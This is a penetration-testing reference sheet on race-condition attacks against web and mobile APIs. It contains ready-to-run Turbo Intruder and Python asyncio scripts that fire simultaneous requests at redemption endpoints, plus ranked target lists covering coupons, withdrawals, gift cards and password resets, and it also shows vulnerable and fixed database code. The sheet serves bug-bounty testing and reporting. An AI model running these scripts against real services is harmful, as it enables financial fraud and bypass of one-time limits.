# Race Conditions — BLF Multiplier Reference

## Theory: The Race Window

```
Non-atomic operation:
  1. CHECK (read state)       ← attacker enters here
  2. ... gap ...              ← race window
  3. ACT (modify state)       ← two threads collide

Goal: Send N requests simultaneously so multiple pass CHECK
before any ACT completes.
```

## Single-Packet Attack (Smashing the State Machine, 2023)

```
Classic race: network jitter causes timing variance → unreliable
Single-packet: send ALL requests in ONE TCP packet → server processes
              simultaneously with ZERO jitter

Only possible if:
- HTTP/2: multiple streams in one connection (always)  
- HTTP/1.1: last-byte sync technique (Turbo Intruder)
```

## Turbo Intruder: Single-Packet Race

```python
# Paste in Turbo Intruder → Send (Ctrl+Enter)
# Replace one parameter per request if needed with %s

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Gate all requests, fire simultaneously
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Flag responses that differ from baseline
    if req.status != 404:
        table.add(req)
```

## Python Async Race (no Burp needed)

```python
import asyncio
import httpx

TARGET = "https://target.com/api/v1/redeem"
HEADERS = {
    "Authorization": "Bearer YOUR_TOKEN",
    "Content-Type": "application/json"
}
PAYLOAD = {"code": "COUPON50"}

async def send_one(client, session_id):
    r = await client.post(TARGET, headers=HEADERS, json=PAYLOAD)
    print(f"[{session_id}] {r.status_code}: {r.text[:100]}")
    return r

async def race(n=25):
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [send_one(client, i) for i in range(n)]
        results = await asyncio.gather(*tasks)
    
    # Analyze: how many 200s?
    successes = [r for r in results if r.status_code == 200]
    print(f"\n[+] {len(successes)}/{n} succeeded — race condition confirmed!")

asyncio.run(race())
```

## High-Value Race Condition Targets

### Tier 1 — Critical (Direct Financial Impact)
```
□ Coupon/voucher redemption (one-time codes)
□ Referral bonus claim
□ Free credits / trial activation
□ Withdrawal / transfer (balance check → deduct)
□ Refund initiation
□ Gift card redemption
□ Reward points spend
□ Flash sale / limited inventory purchase
```

### Tier 2 — High (Privilege / Access)
```
□ Invitation acceptance (seat limits)
□ Team member addition (beyond seat cap)
□ Email/OTP verification (single-use token)
□ Password reset token use
□ 2FA setup (window between old/new secret)
□ Account merge / link
□ Feature activation (trial start)
□ Contest entry (one-per-account limits)
```

### Tier 3 — Medium (Workflow Integrity)
```
□ Order status transitions
□ KYC approval → feature unlock
□ Content publish → moderation queue bypass
□ Duplicate account creation
□ Leaderboard score submission
□ Achievement unlock
□ API rate limit bypass
```

## TOCTOU Patterns

```
Pattern: Time-Of-Check To Time-Of-Use

1. CHECK: if user.balance >= amount → pass
2. USE: user.balance -= amount

Attack: Two withdrawals execute check simultaneously,
        both pass (balance = $100, withdraw $100 twice)
        → balance goes to -$100

Detection: Any endpoint that reads THEN writes without transaction lock
Testing: Race two identical requests, check final state
Tools: Turbo Intruder, asyncio, wrk (for HTTP/1.1 targets)
```

## Multi-Step Race Attacks

```
Advanced: Race across DIFFERENT endpoints

Example (Stripe-style):
Step 1: POST /discount/apply → sets discount=active
Step 2: POST /checkout/complete → reads discount=active

Race attack:
- Thread A: complete checkout with discount (legitimate)
- Thread B: re-apply discount while Thread A is at step 2
→ Thread A sees discount=active, completes
→ Thread B re-applies discount, Thread A2 also completes
→ Discount used twice

HOW TO TEST:
1. Map state transitions across endpoints
2. Identify which endpoint reads state set by another
3. Race the "set" endpoint while "read" endpoint is processing
```

## Race on Mobile APIs

```
Android:
□ Execute racing from Burp Repeater (parallel tabs trick)
□ Use asyncio script against intercepted API endpoint
□ ADB: launch app multiple times simultaneously
□ Modify Smali to trigger rapid-fire API calls

iOS:
□ Same as Android for API-level races
□ Race StoreKit: rapid tap purchase button (UI race)
□ Deep link race: open deep link rapidly
□ Background task + foreground action race
```

## Detecting Race Condition in Source Code (SAST Hint)

```
Vulnerable patterns (when reviewing source):

// Node.js — no transaction:
const balance = await db.query('SELECT balance FROM users WHERE id=?', [id]);
if (balance >= amount) {
  await db.query('UPDATE users SET balance = balance - ? WHERE id=?', [amount, id]);
}

// Secure version:
await db.beginTransaction();
const balance = await db.query('SELECT balance FROM users WHERE id=? FOR UPDATE', [id]);
if (balance >= amount) {
  await db.query('UPDATE users SET balance = balance - ? WHERE id=?', [amount, id]);
  await db.commit();
}

// Python Django — no atomic:
user = User.objects.get(id=user_id)
if user.credits >= cost:
    user.credits -= cost  # RACE: another request reads before this saves
    user.save()

// Secure:
from django.db.models import F
User.objects.filter(id=user_id, credits__gte=cost).update(credits=F('credits') - cost)
```

## Race PoC Evidence Collection

```
For report: capture ALL concurrent responses
□ Screenshot Turbo Intruder results table (multiple 200 OK)
□ Show final database state (balance went negative, or coupon used 20x)
□ Include timestamps proving simultaneous execution
□ Calculate financial impact: $X × N concurrent requests
```
